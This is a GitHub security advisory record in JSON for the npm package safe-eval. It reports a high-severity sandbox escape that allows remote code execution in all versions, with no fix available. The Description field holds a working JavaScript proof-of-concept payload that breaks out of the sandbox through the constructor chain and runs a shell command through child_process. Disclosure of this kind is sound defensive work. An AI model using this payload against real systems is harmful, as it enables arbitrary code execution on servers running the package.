{
  "Severity": "HIGH",
  "UpdatedAt": "2020-08-31T18:44:50Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "safe-eval"
  },
  "Advisory": {
    "DatabaseId": 2690,
    "Id": "MDE2OlNlY3VyaXR5QWR2aXNvcnlHSFNBLTlwY2YtaDhxOS02M2Y2",
    "GhsaId": "GHSA-9pcf-h8q9-63f6",
    "References": [
      {
        "Url": "https://www.npmjs.com/advisories/1033"
      },
      {
        "Url": "https://github.com/advisories/GHSA-9pcf-h8q9-63f6"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-9pcf-h8q9-63f6"
      }
    ],
    "Description": "All versions of `safe-eval` are vulnerable to Sandbox Escape leading to Remote Code Execution. A payload chaining a function's callee and caller constructors can escape the sandbox and execute arbitrary code.  \n\nFor example, the payload \n```\n((() =\u003e { \nconst targetKey = Object.keys(this)[0]; \nObject.defineProperty(this, targetKey, { \nget: function() { \nreturn arguments.callee.caller.constructor( \n\"return global.process.mainModule.require('child_process').execSync('pwd').toString()\" \n)(); \n} \n}); \n})();```\nmay be used to print the `pwd` to the console.\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2020-09-03T17:12:41Z",
    "Severity": "HIGH",
    "Summary": "Sandbox Breakout / Arbitrary Code Execution in safe-eval",
    "UpdatedAt": "2023-01-09T05:04:08Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": ""
      },
      "VulnerableVersionRange": "\u003e= 0.0.0"
    }
  ]
}